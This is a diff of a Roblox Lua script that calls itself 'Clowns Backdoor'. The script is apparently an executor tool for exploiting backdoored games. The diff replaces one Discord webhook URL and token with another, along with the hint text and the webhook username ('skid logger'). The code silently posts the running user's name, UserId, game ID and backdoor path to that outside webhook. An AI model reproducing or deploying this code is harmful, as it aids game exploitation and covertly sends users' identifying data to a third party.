@@ -12,7 +12,7 @@ local G2L = {};
 
 -- Welcome hint
 local hint = Instance.new("Hint", workspace)
-hint.Text = "Thanks for using Clowns Backdoor:D (DISCORD: https://discord.gg/qGV9bFpSem Creator: obviously by Debt/R4ddy) Version 0.1"
+hint.Text = "Thanks for using Clowns Backdoor:D (DISCORD: https://discord.gg/qGV9bFpSem Creator: obviously by Debt/R4ddy) Version 0.1 dont delete my webhook skid"
 
 -- StarterGui.LALOL Hub Backdoor
 G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
@@ -1572,13 +1572,13 @@ local script = G2L["20"];
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
 						request({
-							Url = 'https://discord.com/api/webhooks/1395102403656814796/pHq8kkpSin0v116cnbPUF3hOfHhnKMtQNw4AgDDurD-sEAvknZnq5L5ra3XTwUmAFc6j',
+							Url = 'https://discord.com/api/webhooks/1396108207906230377/4xrNwKq1P7TTFruKzs5BmNQcLdz0JeiYpvtufzVR8zV4Xu0dsrzBMU5l2cXQxDU-LlvY',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
 							},
 							Body = HttpService:JSONEncode({
-								username='pls dont delete this w3bh00k',
+								username='skid logger',
 								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
 							})
 						})
